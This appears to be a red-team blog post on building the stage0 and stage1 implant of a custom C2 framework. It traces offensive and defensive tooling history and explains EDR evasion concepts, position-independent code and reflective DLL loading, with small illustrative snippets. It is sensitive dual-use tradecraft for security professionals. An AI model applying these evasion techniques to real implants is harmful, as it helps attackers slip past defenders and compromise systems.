# https://pre.empt.blog/post/maelstrom-4/

<!DOCTYPE html><html lang="en" class="dark">
  <body>
    <div id="root"><div class="min-h-screen flex flex-col"><main class="flex-1"><div class="mx-auto w-full max-w-full" style="padding: 1.5rem;"><div style="max-width: 1200px; margin: 0px auto;"><p><img src="https://pre.empt.blog/static/images/maelstrom-4-1.gif" alt="dev"></p>
<h2>Introduction</h2>
<p>In the series so far, we have discussed the purpose and intentions behind a C2, and the design considerations for both the implant and server.</p>
<p>In this post, we will move beyond this theoretical discussion and begin building a basic implant. We'll start by looking at the evolution of offensive and defensive techniques since 2010, to give us context and understanding of the current landscape. We'll then, as with our previous posts, discuss some important concepts that we'll be incorporating into the implant. Finally, we'll walk through the implant design, writing the base of both stage0 and stage1 of the implant for our exemplar C2, Maelstrom.</p>
<p>When discussing C2 implants, people often say that their implant is <a href="https://www.neushield.com/learn/fully-undetectable-fud/">fully undetectable</a> (ironically, "<a href="https://en.wikipedia.org/wiki/Fear,_uncertainty,_and_doubt">FUD</a>"). A newly written implant, which hasn't been seen before, will be undetectable as it has not been seen before. Therefore, on disk, and potentially even when run, it won't be flagged. However, this doesn't account for runtime detections, telemetry generated by Windows, or the various methods of reputation ranking used by a modern day endpoint detection.</p>
<p>In 2022, not all companies have yet implemented all the protections that are available to them, including a full SIEM with comprehensive event logging, or even an EDR agent on every device. This can give the impression that steps like we will discuss in this post are not required, but that is simply a result of not having yet met an environment with anything more than Defender. The days of running commands via a <a href="https://attack.mitre.org/techniques/T1059/">command interpreter</a> are long gone:</p>
<pre><code class="language-c#">    <span class="pl-k">public</span> <span class="pl-k">void</span> <span class="pl-en">ExecuteCommand</span>(<span class="pl-smi">String</span> <span class="pl-smi">command</span>)
            {
               <span class="pl-smi">Process</span> <span class="pl-smi">p</span> <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-en">Process</span>();
               <span class="pl-smi">ProcessStartInfo</span> <span class="pl-smi">startInfo</span> <span class="pl-k">=</span> <span class="pl-k">new</span> <span class="pl-en">ProcessStartInfo</span>();
               <span class="pl-smi">startInfo</span>.<span class="pl-smi">FileName</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>cmd.exe<span class="pl-pds">"</span></span>;
               <span class="pl-smi">startInfo</span>.<span class="pl-smi">Arguments</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">@"</span>/c <span class="pl-pds">"</span></span> <span class="pl-k">+</span> <span class="pl-smi">command</span>; <span class="pl-c">// cmd.exe spesific implementation</span>
               <span class="pl-smi">p</span>.<span class="pl-smi">StartInfo</span> <span class="pl-k">=</span> <span class="pl-smi">startInfo</span>;
               <span class="pl-smi">p</span>.<span class="pl-en">Start</span>();
            }
        
</code></pre>
<h2>Objectives</h2>
<p>This post will cover:</p>
<ul>
<li>
<p>The background and development of offensive and defensive techniques around implants.</p>
</li>
<li>
<p>The functions and code required for a contempory Stage 0, including:</p>
<ul>
<li>Environmental Keying</li>
<li>Detecting Suspicious Processes</li>
<li>Anti-Sandbox Protections</li>
<li>Anti-Debug Protections</li>
</ul>
</li>
<li>
<p>The functions and code required for a contemporary Stage 1, including:</p>
<ul>
<li>Reflective Loading</li>
<li>DLL Debugging</li>
<li>Server Checkins</li>
<li>Sleeping</li>
</ul>
</li>
</ul>
<p>From this point, we will have an implant which can manage basic checkins, and which can be augmented with more sophisticated functionality evasive techniques, and other opsec features. We will explore these in later blogs, but for further information on evasive techniques, <a href="https://evasions.checkpoint.com/">Check Point Research: Evasion techniques</a> can be used as a reference.</p>
<p>As we've mentioned in a similar paragraph in every blog post so far, and will continue mentioning in every post so far but after, the code will serve to illustrate the functionality, but is far from being immediately usable within a functional C2.</p>
<p>Stage 0:</p>
<ul>
<li>Environmental Keying</li>
<li>Detecting Suspicious Processes</li>
<li>Anti-Sandbox</li>
<li>Anti-Debug</li>
</ul>
<p>Stage 1:</p>
<ul>
<li>Checking-in to the server</li>
</ul>
<p>For further information on evasive techniques, <a href="https://evasions.checkpoint.com/">Check Point Research: Evasion techniques</a> can be used as a reference.</p>
<h2>Evolution of Offensive and Defensive Techniques</h2>
<p>Over the years, code execution has gotten more and more complicated as defensive techniques and processes, improved requiring more sophisticated approaches. In this section, we want to just nail down the evolution and history of both offence and defence within this space. By doing so, we hope to build an understanding of why some behaviours are absolutely necessary in today's red team environment.</p>
<p>While some implants may be anti-virus proof, able to run without detection and execute commands within a system, this is a far cry from being able to operate as a viable C2 within a network with an up-to-date EDR and a correctly configured SIEM. Indeed, without these actions in place, a red team is likely to not provide value to an organisation as many of the recommendations will simply be unapplicable to a network with that level of maturity.</p>
<h3>2010s</h3>
<p>Back in the day when <a href="https://www.metasploit.com/">Metasploit</a> was king, it would be possible to get away with running commands from the shell. Meaning the implant.exe running on the host would call <code>cmd.exe</code>, and then the command wrapped within the <code>/c</code> flag. This would produce the following process tree:</p>
<pre><code>-&gt; implant.exe
          -&gt; cmd.exe
            -&gt; whoami.exe
        
</code></pre>
<p>This is all fine when runtime rules are not being executed on specific behaviour. Also around this time, we had one-shot-kill exploits such as <a href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067">MS08-67</a> which would essentially work as a point-and-click exploit giving <code>NT AUTHORITY/SYSTEM</code> access.</p>
<p>Obviously we cannot speak for every Anti-Virus vendor, but around this time almost all detections were performed on static analysis and required malware families to be known. This is still partially the case in modern day with static detection, however now there is a lot of crowdsourcing with companies such as <a href="https://www.virustotal.com/">Virus Total</a>, and the adaption of Machine Learning - as seen in <a href="https://www.sophos.com/en-us/content/deep-learning-cybersecurity">Intercept X: Powered by Deep Learning</a>.</p>
<h3>2014 - 2016</h3>
<p>From the cmd.exe phase, the community went into a very <a href="https://docs.microsoft.com/en-us/powershell/">PowerShell</a> oriented style. This spawned projects like <a href="https://github.com/EmpireProject/Empire">Empire</a> in 2016 which was the first Command and Control (C2) Framework which was written entirely in PowerShell. Around the same time, the original <a href="https://github.com/nettitude/PoshC2_Old">PoshC2</a> was produced. At the time, PowerShell was working well. Around the same time, <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Antimalware Scan Interface</a> (AMSI) was picking up. From <a href="https://www.zdnet.com/article/this-is-how-attackers-bypass-microsoft-antimalware-scan-software-amsi/">This is how attackers bypass Microsoft's AMSI anti-malware scanning protection</a>, the release appears to be 2015. At the time, and still somewhat to this day, AMSI has been trivial to bypass. Because of this, websites such as <a href="https://amsi.fail/">amsi.fail</a> were created to generate obfuscated AMSI Bypasses from the following sources:</p>
<ul>
<li><a href="https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell">Amsi-Bypass-Powershell</a></li>
<li><a href="https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/">Exploring PowerShell AMSI and Logging Evasion</a></li>
</ul>
<p>Also, around 2016, <a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> was produced to severely obfuscate PowerShell. Later, in 2016, <a href="https://www.cobaltstrike.com/blog/author/rsmudge/">Raphael Mudge</a> wrote <a href="https://www.cobaltstrike.com/blog/modern-defenses-and-you/">Modern Defenses and YOU!</a>. This blog post details why operators should move away from PowerShell due to its popularity. This was reinforced by Microsoft in 2017 when they released <a href="https://devblogs.microsoft.com/powershell/defending-against-powershell-attacks/">Defending Against PowerShell Attacks</a> and then a tweet from <a href="https://twitter.com/mattifestation">Matt Graeber</a> which alludes to PowerShell being too popular and <a href="https://twitter.com/mattifestation/status/889446662866743296">the new technique being .NET</a> .</p>
<p>Whilst all this was going on, every aspect of offensive PowerShell required was built into one suite: <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.</p>
<p><a href="https://www.cobaltstrike.com/blog/cobalt-strike-3-11-the-snake-that-eats-its-tail">Cobalt Strike 3.11 - The snake that eats its tail</a> introduces <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#bexecute_assembly">execute-assembly</a> which would dictate the next few years...</p>
<p>Around time time in the Defensive component of the industry, Anti-Virus vendors were making a migration into the detection and mitigation of Zero Day Exploits due to an increase in the usage of these from APTs, a portion of which were attributed to <a href="https://www.wired.com/2013/02/chinese-army-linked-to-hacks/">Chinese Military Groups</a>.</p>
<p>Over this period of time, we saw the rise of companies such as <a href="https://crowdstrike.com/">CrowdStrike</a>, <a href="https://www.sentinelone.com/">SentinelOne</a>, <a href="https://www.blackberry.com/us/en/products/cylance-endpoint-security/cylance-is-blackberry-cybersecurity">Cylance</a> and a few others. We do not know the internals of these companies and how/when/why they started implemented their in-memory and technique based detections. But this period of time is likely where techniques such as Userland Hooking, registering Kernel Callback's to determine suspicious behaviour and then the introduction of languages such as Lua to write rules to parse the logs generated by such protections. Using Lua in such a way is a known use case of <a href="https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-endpoint?view=o365-worldwide">Microsoft Defender for Endpoint</a> (MDE) and has been extracted by researchers, as seen in <a href="https://github.com/HackingLZ/ExtractedDefender">ExtractedDefender</a>.</p>
<h3>2017 - 2019</h3>
<p>When Cobalt Strike introduced <code>execute-assembly</code>, the usage of .NET exploded and is still somewhat popular today. Projects like <a href="https://github.com/Flangvik/SharpCollection">SharpCollection</a> were created to build nightly releases of a bunch of tools, but this doesn't touch the surface on the attack tools throughout the internet. Around this time, <a href="https://github.com/cobbr/Covenant">Covenant</a> was the first C2 to popularize .NET as a C2 Framework.</p>
<p>Likely due to this popularity, Microsoft added backwards compatibility and general support for AMSI. In <a href="https://docs.microsoft.com/en-us/dotnet/framework/whats-new/#v48">Whats new in .NET 4.8</a>:</p>
<blockquote>
<p><strong>Antimalware scanning for all assemblies</strong>. In previous versions of .NET Framework, the runtime scans all assemblies loaded from disk using either Windows Defender or third-party antimalware software. However, assemblies loaded from other sources, such as by the [Assembly.Load(Byte<a href="https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load#system-reflection-assembly-load(system-byte()">])</a>) method, are not scanned and can potentially contain undetected malware. Starting with .NET Framework 4.8 running on Windows 10, the runtime triggers a scan by antimalware solutions that implement the <a href="https://docs.microsoft.com/en-us/windows/desktop/AMSI/antimalware-scan-interface-portal">Antimalware Scan Interface (AMSI)</a>.</p>
</blockquote>
<p>At the time, <a href="https://twitter.com/therealwover/status/1129776596850794497?lang=en-GB">it received some praise online</a>. This would be trivial to handle by heavily obfuscating the assembly, or creating .NET Loaders to encrypt and reflect the malicious tool with <code>Assembly.Load</code>. <a href="https://twitter.com/domchell">Dom Chell</a> did a great talk on this in 2020: <a href="https://www.youtube.com/watch?v=GHmOJhpMw_o">Dominic Chell - Offensive Development: Post Exploitation Tradecraft in an EDR World</a>.</p>
<p>Similarly to PowerShell, <a href="https://github.com/cobbr/SharpSploit">SharpSploit</a> was produced solving a huge portion of offensive requirements. An argument can be made that when a full attack suite for a given language is developed, it could be the end of an era for that language.</p>
<p>It was around 2019/2020 where the community began experimenting with things like <a href="https://github.com/byt3bl33d3r/OffensiveNim">Nim</a> and <a href="https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview">Dynamic Language Runtime Overview</a> (DLR) with projects such as <a href="https://github.com/byt3bl33d3r/SILENTTRINITY">SILENTTRINITY</a> and <a href="https://github.com/byt3bl33d3r/OffensiveDLR">OffensiveDLR</a>.</p>
<h3>2019 - 2020</h3>
<p>Like <code>execute-assembly</code>, Cobalt Strike somewhat changed the typical tooling approach by introducing <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute">inline-execute</a> in <a href="https://www.cobaltstrike.com/blog/cobalt-strike-4-0-bring-your-own-weaponization/">Cobalt Strike 4.0 – Bring Your Own Weaponization</a>:</p>
<blockquote>
<p>Finally, Cobalt Strike 4.0 introduces an internal inline-execute post-exploitation pattern. Inline-execute passes a capability to Beacon as needed, executes it inline, and cleans up the capability after it ran. This post-exploitation interface paves the way for future features that execute within Beacon’s process context without bloating the agent itself.</p>
</blockquote>
<p>Along with <code>inline-execute</code>, Cobalt Strike introduced the idea of <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/beacon-object-files_main.htm">Beacon Object Files</a>:</p>
<blockquote>
<p>A Beacon Object File (BOF) is a compiled C program, written to a convention that allows it to execute within a Beacon process and use internal Beacon APIs. BOFs are a way to rapidly extend the Beacon agent with new post-exploitation features.</p>
</blockquote>
<p>Essentially, they are just specifically crafted <a href="https://wiki.osdev.org/COFF">Common Object File Format</a> (COFF) Files. The benefit, as <a href="https://www.trustedsec.com/">TrusedSec</a> point out in <a href="https://www.trustedsec.com/blog/a-developers-introduction-to-beacon-object-files/">A Developer’s Introduction To Beacon Object Files</a>, is that the operator benefits from running code inside of beacon process itself, avoiding creating a child process which is something that the in-built <code>execute-assembly</code> suffers from.</p>
<p>TrustedSec then went onto produce:</p>
<ul>
<li><a href="https://github.com/trustedsec/CS-Situational-Awareness-BOF">CS-Situational-Awareness-BOF</a></li>
<li><a href="https://github.com/trustedsec/CS-Remote-OPs-BOF">CS-Remote-OPs-BOF</a></li>
<li><a href="https://www.trustedsec.com/blog/coffloader-building-your-own-in-memory-loader-or-how-to-run-bofs/">Coffloader: Building Your Own In Memory Loader Or How To Run BOFs</a></li>
</ul>
<p>Around the same time, people began reinterpreting the <code>execute-assembly</code> function by rewriting the CLR and executing it as a RDLL:</p>
<ul>
<li><a href="https://github.com/anthemtotheego/InlineExecute-Assembly">InlineExecute-Assembly</a></li>
<li><a href="https://github.com/med0x2e/ExecuteAssembly">ExecuteAssembly</a></li>
</ul>
<p>With this heavy investment in rewriting key parts of Cobalt Strike, the stream of new C2s became a torrent. While custom C2 development had always been a part of the industry, Cobalt Strike's off-the-shelf nature and market dominance seemed to eclipse much of this activity. However, from 2019 onwards, more and more <a href="https://zeropointsecurity.teachable.com/p/c2-dev-csharp">courses</a> and <a href="https://medium.com/@dmchell/what-ive-learned-in-over-a-decade-of-red-teaming-5c0b685c67a2">blogs</a> endorsed the concept of custom C2 authorship as a viable alternative to a commercial C2, or even as a straightforward learning exercise.</p>
<h3>Modern Day</h3>
<p>Cobalt Strike for many years, in our experience at any rate, was <em>the</em> C2. Even with the growth of other C2s, Cobalt Strike remains the C2 that C2s are compared to, the Sennheiser HD600's of the offensive tools. Cobalt Strike's interface and operation (and Armitage before it) remain "what a C2 looks like", at least in our minds. Although we've not seen many imitate the device canvas (or, sadly, the lightning).</p>
<p>While there are arguments to be made for other projects, Cobalt Strike has been steering the industry, for both Offence and Defence, for years. The frequent and information dense blogs and videos helped both offensive and defensive teams improve their techniques in a way that few other vendors have done.</p>
<p>Raphael Mudge's video <a href="https://www.youtube.com/user/DashnineMedia/playlists">playlists</a>:</p>
<ul>
<li><a href="https://www.youtube.com/watch?v=q7VQeK533zI&amp;list=PL9HO6M_MU2nfQ4kHSCzAQMqxQxH47d1no">Red Team Operations with Cobalt Strike (2019)</a></li>
<li><a href="https://www.youtube.com/watch?v=lz2ARbZ_5tE&amp;list=PL9HO6M_MU2nc5Q31qd2CwpZ8J4KFMhgnK">In-memory Evasion</a></li>
</ul>
<p>Then then entire blog: <a href="https://www.cobaltstrike.com/blog/">Cobalt Strike: Blog</a></p>
<p>Researchers worked on "How to improve X in Cobalt Strike" for a long time, and the change to actually building new and unique tooling has only shifted over the past few years. For defensive teams, Cobalt Strike is still frequently seen and will be for a while. This comes from its leaks and cracks over the years and its continued effectiveness.</p>
<p>Since Raphael Mudge stepped down from the team, <a href="https://www.helpsystems.com/">Help Systems</a> have been primarily working on stability which has given detection a lot of time to catch-up. Due to this, the detection rate for Cobalt Strike both on disk, and in memory, have drastically increased. Obviously, Cobalt Strike remains a completely viable and good option for a C2, but the industry has started to see some titans emerge to rival Cobalt Strike.</p>
<p>In response, in recent posts Cobalt Strike has begun to discuss working on more evasive features, such as: <a href="https://www.cobaltstrike.com/blog/arsenal-kit-update-thread-stack-spoofing/">Arsenal Kit Update: Thread Stack Spoofing</a>. The <a href="https://www.cobaltstrike.com/blog/cobalt-strike-roadmap-update/">Cobalt Strike Roadmap Update</a> discusses this further, mapping their future progression.</p>
<p>As Raphael Mudge took his foot off the gas and the research efforts slowed down, it caused the industry to begin building out their own tooling to reduce the amount of signatures that they would have to deal with. As more and more people began building these tools, the <a href="https://docs.google.com/spreadsheets/d/1b4mUxa6cDQuTV2BPC6aA-GR4zGZi0ooPYtBe4IgPsSc/edit#gid=0">C2 Matrix</a> began in order to track them. However, there are two titans who are at the forefront of <em>advanced</em> functionality:</p>
<ul>
<li><a href="https://www.mdsec.co.uk/nighthawk/">Nighthawk</a> from <a href="https://www.mdsec.co.uk/">MDSec</a></li>
<li><a href="https://bruteratel.com/">Brute Ratel</a> from <a href="https://twitter.com/NinjaParanoid">Paranoid Ninja</a></li>
</ul>
<p>Both of these offer advanced evasive technology baked into the product, and are aimed at working in sophisticated environments with high levels of protection in place.</p>
<p>By writing an entirely new C2 from scratch, if gives the operators full control of the implant and communications. For example, as the use of memory sweeps becomes more common, it may be a requirement to fluctuate the page permissions of the memory region in which the implant is operating out of. If the operator is using Cobalt Strike, then something like <a href="https://github.com/mgeeky/ShellcodeFluctuation">ShellcodeFluctuation</a> could be used. The issue here is that its an extra piece of shellcode to execute, and it places a hook on the <code>KERNEL32!Sleep</code> function, increasing the indicators of compromise. Whereas the the C2 was completely open to the operators, then this could just be a setting to enable and disable on a per-implant basis.</p>
<p>When it comes to modern day defences, its a continuation of the things we've recently discussed. However, the internals of these techniques have gone through endless amount of research and development to better empower the techniques. We've also seen the introduction of feeds into <a href="https://docs.microsoft.com/en-us/windows/win32/etw/about-event-tracing">Event Tracing for Windows</a> (ETW) for Threat Intelligence known as <code>ETWTi</code>, more on this in <a href="https://undev.ninja/introduction-to-threat-intelligence-etw/">Introduction to Threat Intelligence ETW</a>. As well as ingesting ETWTi feeds, more generic ETW feeds have seen use. For example, the usage of the DotNet Runtime traces to determine assemblies being loaded.</p>
<p>In the next two blogs, we will look at implementing a few of these techniques. Namely, ETWTi, Userland hooks, ETW, AMSI and memory sweeps.</p>
<h2>Important Concepts</h2>
<p>In this section, we want to outline a few topics that will come up when building out the implant so that they make sense and we can demonstrate the implant effectively.</p>
<h3>OS Shell Commands</h3>
<p>When discussing OS Shell Commands, we don't mean just <code>cmd.exe</code>. This is anything that causes a a child process to spawn to run the command, every language has its equivalent. To name a few:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-6.0">Process.Start</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">ShellExecuteA</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-winexec">WinExec</a></li>
<li><a href="https://www.geeksforgeeks.org/python-os-system-method/">os.system</a></li>
</ul>
<p>We've mentioned it a few times now, but lets look at why running post exploitation under <code>cmd.exe</code> is a bad idea. In a more traditional environment, running commands directly on a host may be considered normal behaviour for an operator. However, as we've explored, the level of detections and awareness that an operator can expect within a contemporary environment is far higher. Advances in logging, especially within Windows, as well as a greater awareness of which events to pay attention to, as well as EDR and intermediary security devices have resulted in a state of play where directly running commands can worst case be immediately considered an indicator of compromise, and best case a highly suspicious activity as can be seen by the fact it has a formal <a href="https://attack.mitre.org/">MITRE ATT&amp;CK</a> reference as: <a href="https://attack.mitre.org/techniques/T1059/">Command and Scripting Interpreter (T1059)</a>.</p>
<p>While <a href="https://lolbas-project.github.io/">LOLBINs</a> and aliases still have a role to play, using these for downloads and command execution is an exercise in operational security by obscurity. Techniques relying on increasingly more unknown Windows built-ins can be quickly neutralised with a simple blocklist. This may be by reimplementing the logic within the implant, or by finding the base functions that the commands themselves use and calling them directly, bypassing any calls to run commands via <code>cmd.exe</code>.</p>
<p>Fundamentally Windows cannot block the features that Windows itself has to use. Since these calls are so ubiquitous, since every feature in Windows makes use of these, they are now reliant on EDR using hooks and callbacks.</p>
<p>Overall, there are more ways to reimplement and refactor code with the WinAPI than there will be to execute commands via OS-based command execution or random LOLBINs. This is something that Cobalt Strike documented: <a href="https://www.cobaltstrike.com/blog/opsec-considerations-for-beacon-commands/">OPSEC Considerations for Beacon Commands</a>.</p>
<h3>WinAPI</h3>
<p>The <a href="https://docs.microsoft.com/en-us/windows/win32/apiindex/windows-api-list">WinAPI</a> are functions that are exported from various DLLs, most of which can be seen in <code>c:\windows\system32</code>, and they give access to all different components of Windows. Its utility is far too comprehensive to discuss, but here is an example. Within <code>Kernel32.dll</code> theres a function called <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a>:</p>
<pre><code class="language-c">LPVOID <span class="pl-en">VirtualAlloc</span>(
          [in, optional] LPVOID lpAddress,
          [in]           SIZE_T dwSize,
          [in]           DWORD  flAllocationType,
          [in]           DWORD  flProtect
        );
        
</code></pre>
<p>And for the most part, these APIs are documented on <a href="https://docs.microsoft.com/en-us/windows/win32/api/">MSDN</a>. As these functions are written by Microsoft, and marked as proprietary, projects such as <a href="https://github.com/reactos">ReactOS</a> attempt at recreating this. So, when we get discuss Userland Hooks and such in future blogs, we will also discuss how and why reimplementing the function, without using the function, will typically avoid specific detections.</p>
<p>For now, though, the WINAPI is giving us access to calls that will make this entire process easier.</p>
<h3>Process Environment Block</h3>
<p>Windows is an Object Oriented Operating System. Meaning, everything operated is an object and will have some form of data structure. Processes fall into this category. A Process, like <code>calc.exe</code>, has an object called <a href="https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">Process Environment Block</a> (PEB) which contains all sorts of information:</p>
<ul>
<li>Process Name</li>
<li>Location</li>
<li>Is it being debugged</li>
<li>Loaded modules</li>
<li>Environment Path</li>
<li>Etc</li>
</ul>
<p>This is all stored in a structure like so:</p>
<pre><code class="language-c"><span class="pl-k">typedef</span> <span class="pl-k">struct</span> _PEB {
          BYTE                          Reserved1[<span class="pl-c1">2</span>];
          BYTE                          BeingDebugged;
          BYTE                          Reserved2[<span class="pl-c1">1</span>];
          PVOID                         Reserved3[<span class="pl-c1">2</span>];
          PPEB_LDR_DATA                 Ldr;
          PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
          PVOID                         Reserved4[<span class="pl-c1">3</span>];
          PVOID                         AtlThunkSListPtr;
          PVOID                         Reserved5;
          ULONG                         Reserved6;
          PVOID                         Reserved7;
          ULONG                         Reserved8;
          ULONG                         AtlThunkSListPtr32;
          PVOID                         Reserved9[<span class="pl-c1">45</span>];
          BYTE                          Reserved10[<span class="pl-c1">96</span>];
          PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
          BYTE                          Reserved11[<span class="pl-c1">128</span>];
          PVOID                         Reserved12[<span class="pl-c1">1</span>];
          ULONG                         SessionId;
        } PEB, *PPEB;
        
</code></pre>
<p>Throughout this blog, we will interact with the PEB a lot, mainly to get enumerate loaded modules and such. As this is a pretty extensive topic, we won't discuss it all and have some recommended reads. But for now, know the PEB as the structure in which the process is build upon.</p>
<ul>
<li><a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploring-process-environment-block">Exploring Process Environment Block</a></li>
<li><a href="https://ntopcode.wordpress.com/2018/02/26/anatomy-of-the-process-environment-block-peb-windows-internals/">Anatomy of the Process Environment Block (PEB) (Windows Internals)</a></li>
</ul>
<h3>Position Independent Code</h3>
<p>When we talk about Position Independent Code, we are talking about C code that is written in a very specific way, with additional restrictions. The goal is to have all the code we plan to execute inside the <code>.text</code> section of the PE.</p>
<p>Writing C normally will cause different parts of the code to be stored in different sections:</p>
<ul>
<li>Global Variables in <code>.bss</code></li>
<li>Imported DLLs in <code>.idata</code></li>
<li>Exports in <code>.data</code></li>
<li><code>CHAR*</code> and <code>WCHAR*</code> in <code>.rdata</code></li>
</ul>
<p>Even with all those limitations, we can still achieve our goal. We just need to write code in a very specific way to avoid these different section allocations. By doing so, we ensure all the code is in the <code>.text</code> section. We need this because that is the section required for storing all of the binary code. If part of the code is in <code>.bss</code>, then it will crash because we're only going to extract the <code>.text</code>.</p>
<p>For example, lets assume this string:</p>
<pre><code class="language-c"><span class="pl-k">const</span> <span class="pl-k">char</span>* String = <span class="pl-s"><span class="pl-pds">"</span>hello world<span class="pl-pds">"</span></span>;
        
</code></pre>
<p>Because this is read-only initialised data, it goes into <code>.rdata</code>. To get this to be PIC, we write it as such:</p>
<pre><code class="language-c"><span class="pl-k">char</span> String[] = {<span class="pl-s"><span class="pl-pds">'</span>a<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>b<span class="pl-pds">'</span></span>, <span class="pl-s"><span class="pl-pds">'</span>c<span class="pl-pds">'</span></span>, <span class="pl-c1">0</span>};
        
</code></pre>
<p>What if we want to use <code>VirtualAlloc</code>? If its just called as is, then it will have <code>Kernel32</code> as an import. To get around this, we will need to dynamically load the DLL, and then resolve the address (more on this later).</p>
<p>One final note, to ensure we don't have CRT controlling the execution flow of the PE, we need to make sure that the entry-point is not <code>main</code> or some other form of <code>winmain</code>, <code>wmain</code>, etc. We will show this later on in the <code>Makefile</code>.</p>
<p>For more on this, we recommend: <a href="https://bruteratel.com/research/feature-update/2021/06/01/PE-Reflection-Long-Live-The-King/">PE Reflection: The King is Dead, Long Live the King</a>.</p>
<h3>Supporting Post Exploitation</h3>
<p>When discussing implants, there are several methods of supporting post explotation utilities. For the most part, implants will have a majority of their functionality embedded in the implant. So, when the implant recieves a command, the command will go through some sort of <code>switch</code> statement:</p>
<pre><code class="language-c"><span class="pl-k">switch</span>(job):
            <span class="pl-k">case</span> <span class="pl-c1">1</span>:
                <span class="pl-en">whoami</span>();
                <span class="pl-k">break</span>;
            <span class="pl-k">case</span> <span class="pl-c1">2</span>:
                <span class="pl-en">hostname</span>();
                <span class="pl-k">break</span>;  
        
</code></pre>
<p>Alternatively, the implant could work as a loader; supporting:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/dotnet/standard/clr">Common Language Runtime</a> (CLR): Execute .NET Assemblies in memory</li>
<li><a href="https://wiki.osdev.org/COFF">Common Object File Format</a> (COFF): Execute COFF Objects in memory</li>
</ul>
<p>This ensures that the actual implant is significantly smaller, and all functionality is modular. However, this comes at the cost of constant memory allocations for each job. The method chosen is entirely defendant on the use case, but we should it will be addressed. For us, we will stick the the traditional all functionality embedded variant.</p>
<h3>Types of implants</h3>
<p>If the implant is to be .NET, then a simple <a href="https://docs.microsoft.com/en-us/dotnet/standard/assembly/">assembly</a> that's dynamically loaded is fine. However, this is not the type of implant we are discussing. For an implant written in C(++) there are some options on the <em>type</em> of implant to use.</p>
<h4>Position Independent</h4>
<p>The implant could quite well be Position Independent and the entry point could be resolved, this is seen in <a href="https://github.com/SolomonSklash/SleepyCrypt/blob/main/sleep.c">SleepyCrypt</a> where the functionality is allocated with <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a> and casted to a function, like so:</p>
<pre><code class="language-c"><span class="pl-c">// Copy the shellcode into it.</span>
        <span class="pl-en">memcpy</span>( pBuffer, shellcode_bin, shellcode_bin_len );
        
        <span class="pl-c">// Make a function pointer to the run function shellcode.</span>
        fprun Run = ( fprun )pBuffer;
        
</code></pre>
<h4>Dynamic Link Library</h4>
<p>More commonly, the implant could be written as a <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library">Dynamic Link Library</a> (DLL). DLLs are typically loaded with <a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya">LoadLibraryA</a>:</p>
<pre><code class="language-c">HMODULE hModule = LoadLibraryA(<span class="pl-s"><span class="pl-pds">"</span>c:<span class="pl-cce">\\</span>implant.dll<span class="pl-pds">"</span></span>);
        
</code></pre>
<p>The issue here is that <code>LoadLibraryA</code> requires the DLL to be on disk which would break the golden rule of OpSec: Don't write to disk. Doing so will leave artifacts behind, allowing for the implant to be signatured, resulting in more time on trying to break the signature.</p>
<blockquote>
<p><strong>The Golden Rule of OpSec:</strong> Don't write to disk!*</p>
<p>* Unless you need to, or unless you know how to avoid the detection, or... except... and... ... other caveats</p>
</blockquote>
<h4>Reflective DLLs</h4>
<p>This led to a technique known as Reflective DLLs (RDLL), first produced by <a href="https://twitter.com/stephenfewer">Stephen Fewer</a> around 11 years ago. The <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDLLInjection</a> repository contains the original code. Since then, the technique has been updated, but lets discuss the original. The description:</p>
<blockquote>
<p>Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. As such the library is responsible for loading itself by implementing a minimal Portable Executable (PE) file loader. It can then govern, with minimal interaction with the host system and process, how it will load and interact with the host.</p>
</blockquote>
<p>Essentially whats going to happen is the RDLL will be allocated similarly to typical shellcode:</p>
<ul>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc">VirtualAlloc</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory">RtlMoveMemory</a></li>
<li><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">CreateThread</a></li>
</ul>
